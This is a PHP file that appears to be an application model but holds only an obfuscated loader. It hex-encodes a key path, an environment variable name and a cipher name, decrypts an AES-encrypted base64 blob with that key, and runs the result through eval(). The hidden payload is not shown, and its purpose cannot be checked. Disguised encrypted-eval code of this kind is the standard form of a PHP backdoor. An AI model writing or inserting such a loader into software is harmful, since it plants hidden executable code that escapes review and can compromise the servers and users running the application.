<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('wornis1uB/IdpShbn70EvQ==');

$c=base64_decode(

'Q+QjtawrY09M8pGkMg66i7wpr8LOlElptKRUuiycvBgBq1wRZ2fRrFcb7ullwmLyJMXsHRI198TH' .
'OmddYHL5bS5cyOqDdb6jf1KCnzjRKHA6JEydBB+R7YpOEkVWUOmycxAivoC5i0XqshpipbNk9GSR' .
'kuGpIO2GE50+db/havLSTmhnzRx0VbtXic1K1aN2pN5BopLBFegFKc1bj3zQIjrz47DcBSX7LazB' .
'CvpKd2flZhEwwl25gElvzj/KvR6swmlMTTeSFu4ZzORS+Ox2j9p/W0O8wo0uL86HR35PhXh1iU1k' .
'+6nQuNazqn9qZwNszMcIoOBNlxIawBEJcUVnt691LkxPcJ5V7rB0mdaLPPhwZpbAUnmPkBBKcNyD' .
'G1MNqfKI5m3JsdDmGMEneyxyeNgPkVqDzpUdYjIhoNKU2ufozQyzo+Mn0U+AhgUvAlN/tXV7wl9B' .
'ct3LLncLqq0/SeRbiviS95I6PLfRLclFPJ9eRBWwdBiQ90gLcsq+/cRhbBGv4xm2l0qgRbm6jMIJ' .
's2ZF30+vlW4PbqVQqMH3L3T356HNI1ZMD4FfOgTe9aKoB8RFP7tlFQ1HN5H+nkCRPM94+bzpo44B' .
'dmvTd+aa8dwiWyZX1KUKs7AtuRzM7MEtElro2lkx8sT5KBC9Df+kHSUABsyFbAfyNLbA8jhKeoH6' .
'Z1QGQUkctjFntFQNBobXFZ7drMlHUOU7vLXZ9XMQynMJVHdSAjWKE7HqWWZCP+I30tZuJLawc4LN' .
'OOubm0De04VR6FzECZT4KV3W4A9vFUl/BnxUX+xgQiYvhlhIXfjEXUDlRJKVdRB5WFKEztxpAACV' .
'NAO8r3+WKll5KbLGW+LoW2IxisaUkkYP9nDRJx4WS69odvTCqL7OwNu62e8kyOsS5T6+bCJufocl' .
'Kk4g1g31JU1es/jtV4DlOA94iG4vLQcYQzGQ8FsNrCiH1I0Dq3DmssfLvaxmtDq49WrmB9WvF6FD' .
'D+HeksOhvFdhHyCW92A3VA4jEl5/skkhSeWybfMzQW+JADWa45+g04UxuRZ4kTitKsya5CfKXMDM' .
'02Ms8he4fZRQMQpTLqLq3zJ0f3vHl3P+F16VB/biDDznpo2nVAeJuulvE/hloIFTSQe6oh1hxxuc' .
'mGBrvPKMYb0zLG3xaKVy4TkV95y/3CP1fd8gbxiNCkTyF9k2VnAWMtJPPpwNyzdS2hs9tD+IhP0g'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

